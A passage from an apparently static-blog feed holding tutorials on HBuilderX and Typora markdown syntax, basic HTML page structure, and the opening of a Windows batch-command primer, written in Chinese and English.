</ul>
</li>
</ol>
<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>markdown的列表支持有序列表、无序列表以及特殊的任务列表。<br>同样也是在行前加一个特殊符号，并空格后再跟列表文字内容。</p>
<h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><p>有序列表就是有顺序的列表，依靠行前的数字标记顺序。</p>
<ol>
<li>有序列表1 【设置或取消有序列表符的快捷键：Ctrl+Alt+1，可选中多行批量设置序号；支持多光标批量设置列表符，即按Ctrl+鼠标左键添加多光标】</li>
<li>有序列表2 【列表后回车会自动补序号】</li>
<li>有序列表3 【智能双击：双击前面的数字，可重新对数字排序，修正序号错误，并选中有序列表段落（左边的4是故意写错让你体验的）】</li>
</ol>
<h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><p>无序列表就是列表不排序，无序列表因书写随意而被更广泛的使用。<br>无序列表有3种前缀，HX里分别用于表示1级列表、2级列表、3级列表。</p>
<ul>
<li>无序列表1 【快捷键：Ctrl+Alt+-；智能双击：双击-号可选中整段无序列表；再次按Tab会更换二级列表符】</li>
</ul>
<ul>
<li>无序列表2    <ul>
<li>Emmet：li后敲Tab可生成*号列表符，行首生效</li>
<li>快捷键：Ctrl+Alt+8【8即*对应的数字】，支持多光标批量设置列表符，即按Ctrl+鼠标左键添加多光标</li>
<li>智能双击：双击*号可选中整段无序列表</li>
<li>智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动续列表；连续按回车会清除列表符；再次按Tab会更换列表符；在列表符后回车或行尾Shift+回车，上一行留出列表符</li>
<li>*号常用于二级列表，列表符后继续Tab，可切换列表符</li>
</ul>
</li>
</ul>
<ul>
<li>无序列表3 【快捷键：Ctrl+Alt+=；常用于三级列表；其他同上】</li>
</ul>
<h2 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h2><p>任务列表非常实用，管理待办、已办非常便利。<br>[ ] 任务列表-未完成任务 【快捷键：Ctrl+Alt+[】<br>[x] 任务列表-已完成任务 【快捷键：Ctrl+Alt+]】<br>    1. 智能双击：双击方括号内可切换勾选状态，把任务标记为完成或未完成；双击方括号右侧可选中任务列表段落<br>    2. 智能回车：回车后自动补任务列表前缀符号；连续按回车清除前缀符号；在列表符后回车或行尾Shift+回车，上一行留出列表符</p>
<ul>
<li><input disabled="" type="checkbox"> 如需发布到web渲染，需增加无序列表- 的前缀</li>
</ul>
<p>以上三种列表，均支持批量修改列表符，有如下方式建议依次学习尝试：</p>
<ol>
<li>选中多行，按快捷键Ctrl+Alt+“1”或“-”或“[”或“]”，批量设置列表符</li>
<li>如果需要跳行设置有序或无序列表，通过Ctrl+鼠标左键点中目标多行（可不连续），产生多光标，然后按快捷键Ctrl+Alt+“1”或“-”或“[”或“]”，可跳行设置列表符，尤其是有序列表，数字也会跳行加1</li>
<li>按Alt+鼠标选中行首那列（列选择），这样每行行首都有光标，然后再键入或删除列表符即可批量操作</li>
<li>选中多行，按快捷键Ctrl+Shift+\（其实就是Ctrl+|），可以在每行行首添加一个光标</li>
</ol>
<h2 id="引用列表"><a href="#引用列表" class="headerlink" title="引用列表"></a>引用列表</h2><blockquote>
<p>引用1<br>引用2<br>快捷键：Ctrl+Alt+Shift+.<br>智能双击：双击&gt;号可选中整段引用列表<br>智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动续列表；连续按回车会清除列表符；在列表符后回车或行尾Shift+回车，上一行留出列表符</p>
</blockquote>
<h1 id="文字样式语法"><a href="#文字样式语法" class="headerlink" title="文字样式语法"></a>文字样式语法</h1><p><strong>加粗</strong> 【快捷键：Ctrl+B，支持多光标；Emmet：b后敲Tab】<br><strong>加粗2</strong><br><em>倾斜_【Emmet：i后敲Tab；前后包围：选中文字按Ctrl+\是在选区两侧添加光标，可以继续输入_】<br><em>倾斜</em><br><del>删除线</del><br><code>单行代码</code><br>包围插入：先选中文字内容，然后按</em>*~`等符号，会自动在2侧加包围<br>智能双击：双击语法区前面的定义符号，选中包含定义符的整段文字<br>去包围：选中整段文字后，按Ctrl+Shift+]，可去除2侧包围符号</p>
<p>引号括号虽然不属于markdown语法，但也支持相同的包围、选择、去包围操作。<br>引号括号智能双击选择时略特殊的是：双击引号括号内侧，选中引号括号里的内容(不含引号括号)；按下Alt+双击引号括号内侧，则选中包含符号的整段文字</p>
<p>HBuilderX还支持以下对2侧文本高效处理的手段</p>
<ol>
<li>选中文字按Ctrl+\是在选区两侧添加光标，可以继续输入~~，会在2侧同时输入</li>
<li>向2侧扩大选择：【Win:Alt+Shit+→ 、Mac:Ctrl++Shit+→】；由2侧向内减少选择：【Win:Alt+Shit+← 、Mac:Ctrl++Shit+←】</li>
</ol>
<p><a href="http://dcloud.io">链接文字</a></p>
<ol>
<li>Emmet：a后敲Tab</li>
<li>打开链接：Alt+鼠标单击；如果是本地文件，可通过Shift+Alt+单击，在另一分栏打开文件</li>
<li>智能粘贴：粘贴URL会自动变成超链接格式；粘贴本地文件进来也会自动创建引用链接</li>
<li>智能双击：双击语法区开头，即[左侧，选中包含定义符的整段文字</li>
</ol>
<p><img "" class="lazyload placeholder" data-original="logo.jpg" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="图片描述文字"></p>
<ol>
<li>Emmet：img后敲Tab</li>
<li>智能粘贴：粘贴剪切板里的图形时会自动保存为本md文档的附件；删除文档中的图片语法，保存md文档时会自动删除对应的图片附件；粘贴图片文件时自动变成链接引用格式；</li>
<li>悬浮预览：鼠标移到图片语法上，本地图片会自动显示出来</li>
<li>智能双击：双击语法区开头，即!左侧，选中包含定义符的整段文字</li>
</ol>
<h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<ol>
<li>Emmet：table3*3后敲Tab，表示生成3行3列的表格，行首生效</li>
<li>md表格对齐是传统md的痛点，按下Ctrl+K可以自动整理表格格式（暂未兼容不同缩放模式和字体的情况）</li>
<li>支持从excel、wps、word、number的表格中复制粘贴表格进来（不支持合并单元格和单元格换行）</li>
</ol>
<h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><p>————- 【Emmet：hr后敲Tab】</p>
<hr>
<p>=============</p>
<h1 id="代码区"><a href="#代码区" class="headerlink" title="代码区"></a>代码区</h1><pre><code class="javascript">    var a = document</code></pre>
<p>Emmet：code后敲Tab，行首生效<br>智能双击：双击语法区开头，即!左侧，选中包含定义符的整段文字<br>支持代码直接高亮着色，这应该是只有HBuilderX才有的功能。注意需要在代码区开头指定语言类型</p>
<h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><!--注释--> 
<p>快捷键：Ctrl+/<br>智能双击：双击注释首尾的定义符，选中整段注释</p>
<h1 id="其他emmet快捷输入"><a href="#其他emmet快捷输入" class="headerlink" title="其他emmet快捷输入"></a>其他emmet快捷输入</h1><p>day后敲Tab，当前日期。注意day需在行首或前面有空格<br>time后敲Tab，当前时间。注意time需在行首或前面有空格</p>
<h1 id="文档结构图"><a href="#文档结构图" class="headerlink" title="文档结构图"></a>文档结构图</h1><p>文章很长时，word里有文档结构图，HBuilderX也有。<br>菜单视图-文档结构图，快捷键Alt+W(mac是ctrl+W)，轻松管理长文档</p>
<h1 id="运行、预览和打印PDF"><a href="#运行、预览和打印PDF" class="headerlink" title="运行、预览和打印PDF"></a>运行、预览和打印PDF</h1><p>对md文件点工具栏或菜单里的浏览器运行，可以使用外部浏览器预览此md文件，会自动渲染为HTML。<br>点右上角的预览【快捷键Alt+p】，可在HBuilderX右侧预览该md文档的HTML渲染结果。<br>在浏览器中点打印，选择打印到PDF，可将md输出为PDF格式。（注意在打印选项里去掉页眉页脚）</p>
<h1 id="其他常用但你可能不知道的快捷操作技巧"><a href="#其他常用但你可能不知道的快捷操作技巧" class="headerlink" title="其他常用但你可能不知道的快捷操作技巧"></a>其他常用但你可能不知道的快捷操作技巧</h1><ul>
<li>Ctrl+鼠标左键添加多光标，然后敲字或粘贴，可批量处理。Ctrl+鼠标左键拖选，可选中多个选区。</li>
<li>Ctrl+鼠标右键删除多光标</li>
<li>不选内容按Ctrl+C或X可复制或剪切整行</li>
<li>选中2个选区后，按Ctrl+Shift+X，可互换选区内容。如无选区，只是2个光标，则互换2行</li>
<li>Ctrl+上下键可上下移动行</li>
<li>Ctrl+Insert可重复插入当前行，如果有选中内容，可重复插入选中内容</li>
<li>Ctrl+Shift+K可合并多行（是格式化Ctrl+K的反操作）</li>
<li>删除<ul>
<li>按Ctrl+D可删除选中行，支持多光标</li>
<li>Shift+Del删除到行尾</li>
<li>Shift+Backspace删除到行首</li>
</ul>
</li>
<li>选择<ul>
<li>Ctrl+E选相同词(mac是Command+D)，连续按可选中多词进一步操作，比替换更方便</li>
<li>Ctrl+L可连选多行，Ctrl+Shift+L也是选择行，但不选行首尾的空白字符</li>
<li>Ctrl+=可逐级放大选区</li>
<li>双击标题、列表符可选中相应段落</li>
<li>双击英文引号、括号内侧，可选中内部内容</li>
<li>双击缩进符，可选中同缩进段落</li>
<li>双击连字符比如-或_，可选中相连的词，比如双击这里试试，uni-app</li>
</ul>
</li>
<li>查找<ul>
<li>Ctrl+P查找文件</li>
<li>Ctrl+Alt+F可在当前目录的所有文档中搜索指定关键字(mac是Command+Shift+f)</li>
<li>选中文字按F3，查找下一个，Shift+F3找上一个</li>
</ul>
</li>
<li>云同步：HBuilderX+markdown用于云同步笔记的技巧，请参考<a href="http://ask.dcloud.net.cn/article/13097">http://ask.dcloud.net.cn/article/13097</a></li>
</ul>
<p>都学会了吗？<br>markdown语法其实很简单，认真学半小时就能掌握。<br>HBuilderX的极客操作则需要不停反复练习，熟练掌握这些技巧，你将成为高效极客！</p>
]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown_doc_for_Typora</title>
    <url>/2020/10/21/Markdown_Typora/</url>
    <content><![CDATA[<h1 id="Markdown-For-Typora"><a href="#Markdown-For-Typora" class="headerlink" title="Markdown For Typora"></a>Markdown For Typora</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><strong>Markdown</strong> is created by <a href="http://daringfireball.net/">Daring Fireball</a>; the original guideline is <a href="http://daringfireball.net/projects/markdown/syntax">here</a>. Its syntax, however, varies between different parsers or editors. <strong>Typora</strong> is using <a href="https://help.github.com/articles/github-flavored-markdown/">GitHub Flavored Markdown</a>.</p>
<span id="more"></span>

<p>[toc]</p>
<h2 id="Block-Elements"><a href="#Block-Elements" class="headerlink" title="Block Elements"></a>Block Elements</h2><h3 id="Paragraph-and-line-breaks"><a href="#Paragraph-and-line-breaks" class="headerlink" title="Paragraph and line breaks"></a>Paragraph and line breaks</h3><p>A paragraph is simply one or more consecutive lines of text. In markdown source code, paragraphs are separated by two or more blank lines. In Typora, you only need one blank line (press <code>Return</code> once) to create a new paragraph.</p>
<p>Press <code>Shift</code> + <code>Return</code> to create a single line break. Most other markdown parsers will ignore single line breaks, so in order to make other markdown parsers recognize your line break, you can leave two spaces at the end of the line, or insert <code>&lt;br/&gt;</code>.</p>
<h3 id="Headers"><a href="#Headers" class="headerlink" title="Headers"></a>Headers</h3><p>Headers use 1-6 hash (<code>#</code>) characters at the start of the line, corresponding to header levels 1-6. For example:</p>
<pre><code class="markdown"># This is an H1

## This is an H2

###### This is an H6</code></pre>
<p>In Typora, input ‘#’s followed by title content, and press <code>Return</code> key will create a header.</p>
<h3 id="Blockquotes"><a href="#Blockquotes" class="headerlink" title="Blockquotes"></a>Blockquotes</h3><p>Markdown uses email-style &gt; characters for block quoting. They are presented as:</p>
<pre><code class="markdown">&gt; This is a blockquote with two paragraphs. This is first paragraph.
&gt;
&gt; This is second pragraph. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.



&gt; This is another blockquote with one paragraph. There is three empty line to seperate two blockquote.</code></pre>
<p>In Typora, inputting ‘&gt;’ followed by your quote contents will generate a quote block. Typora will insert a proper ‘&gt;’ or line break for you. Nested block quotes (a block quote inside another block quote) by adding additional levels of ‘&gt;’.</p>
<h3 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h3><p>Input <code>* list item 1</code> will create an unordered list - the <code>*</code> symbol can be replace with <code>+</code> or <code>-</code>.</p>
<p>Input <code>1. list item 1</code> will create an ordered list - their markdown source code is as follows:</p>
<pre><code class="markdown">## un-ordered list
*   Red
*   Green
*   Blue

## ordered list
1.  Red
2.     Green
3.    Blue</code></pre>
<h3 id="Task-List"><a href="#Task-List" class="headerlink" title="Task List"></a>Task List</h3><p>Task lists are lists with items marked as either [ ] or [x] (incomplete or complete). For example:</p>
<pre><code class="markdown">- [ ] a task list item
- [ ] list syntax required
- [ ] normal **formatting**, @mentions, #1234 refs
- [ ] incomplete
- [x] completed</code></pre>
<p>You can change the complete/incomplete state by clicking on the checkbox before the item.</p>
<h3 id="Fenced-Code-Blocks"><a href="#Fenced-Code-Blocks" class="headerlink" title="(Fenced) Code Blocks"></a>(Fenced) Code Blocks</h3><p>Typora only supports fences in GitHub Flavored Markdown. Original code blocks in markdown are not supported.</p>
<p>Using fences is easy: Input ``` and press <code>return</code>. Add an optional language identifier after ``` and we’ll run it through syntax highlighting:</p>
<pre><code class="markdown">Here&#39;s an example:

​```
function test() &#123;
  console.log(&quot;notice the blank line before this function?&quot;);
&#125;
​```

syntax highlighting:
​```ruby
require &#39;redcarpet&#39;
markdown = Redcarpet.new(&quot;Hello World!&quot;)
puts markdown.to_html
​```</code></pre>
<h3 id="Math-Blocks"><a href="#Math-Blocks" class="headerlink" title="Math Blocks"></a>Math Blocks</h3><p>You can render <em>LaTeX</em> mathematical expressions using <strong>MathJax</strong>.</p>
<p>To add a mathematical expression, input <code>$$</code> and press the ‘Return’ key. This will trigger an input field which accepts <em>Tex/LaTex</em> source. For example:</p>
<p>$$<br>\mathbf{V}_1 \times \mathbf{V}_2 =  \begin{vmatrix}<br>\mathbf{i} &amp; \mathbf{j} &amp; \mathbf{k} \<br>\frac{\partial X}{\partial u} &amp;  \frac{\partial Y}{\partial u} &amp; 0 \<br>\frac{\partial X}{\partial v} &amp;  \frac{\partial Y}{\partial v} &amp; 0 \<br>\end{vmatrix}<br>$$</p>
<p>In the markdown source file, the math block is a <em>LaTeX</em> expression wrapped by a pair of ‘$$’ marks:</p>
<pre><code class="markdown">$$
\mathbf&#123;V&#125;_1 \times \mathbf&#123;V&#125;_2 =  \begin&#123;vmatrix&#125;
\mathbf&#123;i&#125; &amp; \mathbf&#123;j&#125; &amp; \mathbf&#123;k&#125; \\
\frac&#123;\partial X&#125;&#123;\partial u&#125; &amp;  \frac&#123;\partial Y&#125;&#123;\partial u&#125; &amp; 0 \\
\frac&#123;\partial X&#125;&#123;\partial v&#125; &amp;  \frac&#123;\partial Y&#125;&#123;\partial v&#125; &amp; 0 \\
\end&#123;vmatrix&#125;
$$</code></pre>
<p>You can find more details <a href="https://support.typora.io/Math/">here</a>.</p>
<h3 id="Tables"><a href="#Tables" class="headerlink" title="Tables"></a>Tables</h3><p>Input <code>| First Header  | Second Header |</code> and press the <code>return</code> key. This will create a table with two columns.</p>
<p>After a table is created, putting focus on that table will open up a toolbar for the table where you can resize, align, or delete the table. You can also use the context menu to copy and add/delete individual columns/rows.</p>
<p>The full syntax for tables is described below, but it is not necessary to know the full syntax in detail as the markdown source code for tables is generated automatically by Typora.</p>
<p>In markdown source code, they look like:</p>
<pre><code class="markdown">| First Header  | Second Header |
| ------------- | ------------- |
| Content Cell  | Content Cell  |
| Content Cell  | Content Cell  |</code></pre>
<p>You can also include inline Markdown such as links, bold, italics, or strikethrough in the table.</p>
<p>Finally, by including colons (<code>:</code>) within the header row, you can define text in that column to be left-aligned, right-aligned, or center-aligned:</p>
<pre><code class="markdown">| Left-Aligned  | Center Aligned  | Right Aligned |
| :------------ |:---------------:| -----:|
| col 3 is      | some wordy text | $1600 |
| col 2 is      | centered        |   $12 |
| zebra stripes | are neat        |    $1 |</code></pre>
<p>A colon on the left-most side indicates a left-aligned column; a colon on the right-most side indicates a right-aligned column; a colon on both sides indicates a center-aligned column.</p>
<h3 id="Footnotes"><a href="#Footnotes" class="headerlink" title="Footnotes"></a>Footnotes</h3><pre><code class="markdown">You can create footnotes like this[^footnote].

[^footnote]: Here is the *text* of the **footnote**.</code></pre>
<p>will produce:</p>
<p>You can create footnotes like this[^footnote].</p>
<p>[^footnote]: Here is the <em>text</em> of the <strong>footnote</strong>.</p>
<p>Hover over the ‘footnote’ superscript to see content of the footnote.</p>
<h3 id="Horizontal-Rules"><a href="#Horizontal-Rules" class="headerlink" title="Horizontal Rules"></a>Horizontal Rules</h3><p>Inputting <code>***</code> or <code>---</code> on a blank line and pressing <code>return</code> will draw a horizontal line.</p>
<hr>
<h3 id="YAML-Front-Matter"><a href="#YAML-Front-Matter" class="headerlink" title="YAML Front Matter"></a>YAML Front Matter</h3><p>Typora now supports <a href="http://jekyllrb.com/docs/frontmatter/">YAML Front Matter</a>. Input <code>---</code> at the top of the article and then press <code>Return</code> to introduce a metadata block. Alternatively, you can insert a metadata block from the top menu of Typora.</p>
<h3 id="Table-of-Contents-TOC"><a href="#Table-of-Contents-TOC" class="headerlink" title="Table of Contents (TOC)"></a>Table of Contents (TOC)</h3><p>Input <code>[toc]</code> and press the <code>Return</code> key. This will create a  “Table of Contents” section. The TOC extracts all headers from the document, and its contents are updated automatically as you add to the document.</p>
<h2 id="Span-Elements"><a href="#Span-Elements" class="headerlink" title="Span Elements"></a>Span Elements</h2><p>Span elements will be parsed and rendered right after typing. Moving the cursor in middle of those span elements will expand those elements into markdown source. Below is an explanation of the syntax for each span element.</p>
<h3 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h3><p>Markdown supports two styles of links: inline and reference.</p>
<p>In both styles, the link text is delimited by [square brackets].</p>
<p>To create an inline link, use a set of regular parentheses immediately after the link text’s closing square bracket. Inside the parentheses, put the URL where you want the link to point, along with an optional title for the link, surrounded in quotes. For example:</p>
<pre><code class="markdown">This is [an example](http://example.com/ &quot;Title&quot;) inline link.

[This link](http://example.net/) has no title attribute.</code></pre>
<p>will produce:</p>
<p>This is <a href="http://example.com/" title="Title">an example</a> inline link. (<code>&lt;p&gt;This is &lt;a href=&quot;http://example.com/&quot; title=&quot;Title&quot;&gt;</code>)</p>
<p><a href="http://example.net/">This link</a> has no title attribute. (<code>&lt;p&gt;&lt;a href=&quot;http://example.net/&quot;&gt;This link&lt;/a&gt; has no</code>)</p>
<h4 id="Internal-Links"><a href="#Internal-Links" class="headerlink" title="Internal Links"></a>Internal Links</h4><p><strong>You can set the href to headers</strong>, which will create a bookmark that allow you to jump to that section after clicking. For example:</p>
<p>Command(on Windows: Ctrl) + Click <a href="#block-elements">This link</a> will jump to header <code>Block Elements</code>. To see how to write that, please move cursor or click that link with <code>⌘</code> key pressed to expand the element into markdown source.</p>
<h4 id="Reference-Links"><a href="#Reference-Links" class="headerlink" title="Reference Links"></a>Reference Links</h4><p>Reference-style links use a second set of square brackets, inside which you place a label of your choosing to identify the link:</p>
<pre><code class="markdown">This is [an example][id] reference-style link.

Then, anywhere in the document, you define your link label on a line by itself like this:

[id]: http://example.com/  &quot;Optional Title Here&quot;</code></pre>
<p>In Typora, they will be rendered like so:</p>
<p>This is <a href="http://example.com/" title="Optional Title Here">an example</a> reference-style link.</p>
<p>The implicit link name shortcut allows you to omit the name of the link, in which case the link text itself is used as the name. Just use an empty set of square brackets — for example, to link the word “Google” to the google.com web site, you could simply write:</p>
<pre><code class="markdown">[Google][]
And then define the link:

[Google]: http://google.com/</code></pre>
<p>In Typora, clicking the link will expand it for editing, and command+click will open the hyperlink in your web browser.</p>
<h3 id="URLs"><a href="#URLs" class="headerlink" title="URLs"></a>URLs</h3><p>Typora allows you to insert URLs as links, wrapped by <code>&lt;</code>brackets<code>&gt;</code>.</p>
<p><code>&lt;i@typora.io&gt;</code> becomes <a href="mailto:&#105;&#x40;&#x74;&#x79;&#x70;&#111;&#x72;&#x61;&#46;&#105;&#111;">&#105;&#x40;&#x74;&#x79;&#x70;&#111;&#x72;&#x61;&#46;&#105;&#111;</a>.</p>
<p>Typora will also automatically link standard URLs. e.g: <a href="http://www.google.com">www.google.com</a>.</p>
<h3 id="Images"><a href="#Images" class="headerlink" title="Images"></a>Images</h3><p>Images have similar syntax as links, but they require an additional <code>!</code> char before the start of the link. The syntax for inserting an image looks like this:</p>
<pre><code class="markdown">![Alt text](/path/to/img.jpg)

![Alt text](/path/to/img.jpg &quot;Optional title&quot;)</code></pre>
<p>You are able to use drag &amp; drop to insert an image from an image file or your web browser. You can modify the markdown source code by clicking on the image. A relative path will be used if the image that is added using drag &amp; drop is in same directory or sub-directory as the document you’re currently editing.</p>
<p>If you’re using markdown for building websites, you may specify a URL prefix for the image preview on your local computer with property <code>typora-root-url</code> in YAML Front Matters. For example, input <code>typora-root-url:/User/Abner/Website/typora.io/</code> in YAML Front Matters, and then <code>![alt](/blog/img/test.png)</code> will be treated as <code>![alt](file:///User/Abner/Website/typora.io/blog/img/test.png)</code> in Typora.</p>
<p>You can find more details <a href="https://support.typora.io/Images/">here</a>.</p>
<h3 id="Emphasis"><a href="#Emphasis" class="headerlink" title="Emphasis"></a>Emphasis</h3><p>Markdown treats asterisks (<code>*</code>) and underscores (<code>_</code>) as indicators of emphasis. Text wrapped with one <code>*</code> or <code>_</code> will be wrapped with an HTML <code>&lt;em&gt;</code> tag. E.g:</p>
<pre><code class="markdown">*single asterisks*

_single underscores_</code></pre>
<p>output:</p>
<p><em>single asterisks</em></p>
<p><em>single underscores</em></p>
<p>GFM will ignore underscores in words, which is commonly used in code and names, like this:</p>
<blockquote>
<p>wow_great_stuff</p>
<p>do_this_and_do_that_and_another_thing.</p>
</blockquote>
<p>To produce a literal asterisk or underscore at a position where it would otherwise be used as an emphasis delimiter, you can backslash escape it:</p>
<pre><code class="markdown">\*this text is surrounded by literal asterisks\*</code></pre>
<p>Typora recommends using the <code>*</code> symbol.</p>
<h3 id="Strong"><a href="#Strong" class="headerlink" title="Strong"></a>Strong</h3><p>A double <code>*</code> or <code>_</code> will cause its enclosed contents to be wrapped with an HTML <code>&lt;strong&gt;</code> tag, e.g:</p>
<pre><code class="markdown">**double asterisks**

__double underscores__</code></pre>
<p>output:</p>
<p><strong>double asterisks</strong></p>
<p><strong>double underscores</strong></p>
<p>Typora recommends using the <code>**</code> symbol.</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><p>To indicate an inline span of code, wrap it with backtick quotes (`). Unlike a pre-formatted code block, a code span indicates code within a normal paragraph. For example:</p>
<pre><code class="markdown">Use the `printf()` function.</code></pre>
<p>will produce:</p>
<p>Use the <code>printf()</code> function.</p>
<h3 id="Strikethrough"><a href="#Strikethrough" class="headerlink" title="Strikethrough"></a>Strikethrough</h3><p>GFM adds syntax to create strikethrough text, which is missing from standard Markdown.</p>
<p><code>~~Mistaken text.~~</code> becomes <del>Mistaken text.</del></p>
<h3 id="Underlines"><a href="#Underlines" class="headerlink" title="Underlines"></a>Underlines</h3><p>Underline is powered by raw HTML.</p>
<p><code>&lt;u&gt;Underline&lt;/u&gt;</code> becomes <u>Underline</u>.</p>
<h3 id="Emoji-smile"><a href="#Emoji-smile" class="headerlink" title="Emoji :smile:"></a>Emoji :smile:</h3><p>Input emoji with syntax <code>:smile:</code>.</p>
<p>User can trigger auto-complete suggestions for emoji by pressing <code>ESC</code> key, or trigger it automatically after enabling it on preference panel. Also, inputting UTF-8 emoji characters directly is also supported by going to <code>Edit</code> -&gt; <code>Emoji &amp; Symbols</code> in the menu bar (macOS).</p>
<h3 id="Inline-Math"><a href="#Inline-Math" class="headerlink" title="Inline Math"></a>Inline Math</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>$</code> to wrap a TeX command. For example: <code>$\lim_&#123;x \to \infty&#125; \exp(-x) = 0$</code> will be rendered as LaTeX command.</p>
<p>To trigger inline preview for inline math: input “$”, then press the <code>ESC</code> key, then input a TeX command.</p>
<p>You can find more details <a href="https://support.typora.io/Math/">here</a>.</p>
<h3 id="Subscript"><a href="#Subscript" class="headerlink" title="Subscript"></a>Subscript</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>~</code> to wrap subscript content. For example: <code>H~2~O</code>, <code>X~long\ text~</code>/</p>
<h3 id="Superscript"><a href="#Superscript" class="headerlink" title="Superscript"></a>Superscript</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>^</code> to wrap superscript content. For example: <code>X^2^</code>.</p>
<h3 id="Highlight"><a href="#Highlight" class="headerlink" title="Highlight"></a>Highlight</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>==</code> to wrap highlight content. For example: <code>==highlight==</code>.</p>
<h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>You can use HTML to style content what pure Markdown does not support. For example, use <code>&lt;span style=&quot;color:red&quot;&gt;this text is red&lt;/span&gt;</code> to add text with red color.</p>
<h3 id="Embed-Contents"><a href="#Embed-Contents" class="headerlink" title="Embed Contents"></a>Embed Contents</h3><p>Some websites provide iframe-based embed code which you can also paste into Typora. For example:</p>
<pre><code class="Markdown">&lt;iframe height=&#39;265&#39; scrolling=&#39;no&#39; title=&#39;Fancy Animated SVG Menu&#39; src=&#39;http://codepen.io/jeangontijo/embed/OxVywj/?height=265&amp;theme-id=0&amp;default-tab=css,result&amp;embed-version=2&#39; frameborder=&#39;no&#39; allowtransparency=&#39;true&#39; allowfullscreen=&#39;true&#39; style=&#39;width: 100%;&#39;&gt;&lt;/iframe&gt;</code></pre>
<h3 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h3><p>You can use the <code>&lt;video&gt;</code> HTML tag to embed videos. For example:</p>
<pre><code class="Markdown">&lt;video src=&quot;xxx.mp4&quot; /&gt;</code></pre>
<h3 id="Other-HTML-Support"><a href="#Other-HTML-Support" class="headerlink" title="Other HTML Support"></a>Other HTML Support</h3><p>You can find more details <a href="https://support.typora.io/HTML/">here</a>.</p>
]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML</title>
    <url>/2020/05/03/Web%E5%89%8D%E7%AB%AF_HTML/</url>
    <content><![CDATA[<h1 id="HTML的基本结构"><a href="#HTML的基本结构" class="headerlink" title="HTML的基本结构"></a>HTML的基本结构</h1><pre><code class="html">&lt;!DOCTYPE html&gt;     #文档类型声明
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charest=&quot;UTF-8&quot;&gt;
    &lt;title&gt;网页标题&lt;/title&gt;   #一个网页只有一个标题
&lt;/head&gt;
&lt;body&gt;
&lt;!--网页内容，可以是文本或图像等--&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<ol>
<li><head>
</li>
</ol>
<ul>
<li>下面标签可以用在head部分：<title>  , <meta> , <link> , <style>, <script></li>
<li><head> 标签中必须包含 <title>标签


</li>
</ul>
<ol start="2">
<li><meta>

</li>
</ol>
<pre><code>常见的meta标签有
1. keywords（关键字）keywords用来告诉搜索引擎你网页的关键字是什么
2. description（网站内容描述）description用来告诉搜索引擎你网站的主要内容
3. author（作者）标注网页的作者</code></pre><h1 id="HTML中常用的标签"><a href="#HTML中常用的标签" class="headerlink" title="HTML中常用的标签"></a>HTML中常用的标签</h1><p><img "" class="lazyload placeholder" data-original="/home/blacksheep/.config/Typora/typora-user-images/image-20200625194436236.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20200625194436236"></p>
<ul>
<li>span无语义标签与div标签的区别：div标签可以自动换行，span标签不行</li>
</ul>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2021/03/24/bat%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<hr>
<hr>
<h1 id="bat批处理命令及解释"><a href="#bat批处理命令及解释" class="headerlink" title="bat批处理命令及解释"></a>bat批处理命令及解释</h1><p><a href="https://www.cnblogs.com/xpwi/p/9626959.html">相关原文链接</a></p>
<h2 id="一、批处理概念"><a href="#一、批处理概念" class="headerlink" title="一、批处理概念"></a>一、批处理概念</h2><ul>
<li>批处理文件：包含DOS命令的可编辑可执行文件</li>
<li>批处理：可以对某一对象批量操作的文件</li>
</ul>
<span id="more"></span>

<h2 id="二、批处理命令简介"><a href="#二、批处理命令简介" class="headerlink" title="二、批处理命令简介"></a>二、批处理命令简介</h2><h3 id="命令1-10"><a href="#命令1-10" class="headerlink" title="命令1~10"></a>命令1~10</h3><pre><code>1 echo 和 @
回显命令
@  #关闭单行回显
echo off  #从下一行开始关闭回显
@echo off  #从本行开始关闭回显。一般批处理第一行都是这个
echo on #从下一行开始打开回显
echo #显示当前是 echo off 状态还是 echo on 状态
echo. #输出一个”回车换行”，空白行
#(同echo, echo; echo+ echo[ echo] echo/ echo)

2 errorlevel
echo %errorlevel%
每个命令运行结束，可以用这个命令行格式查看返回码
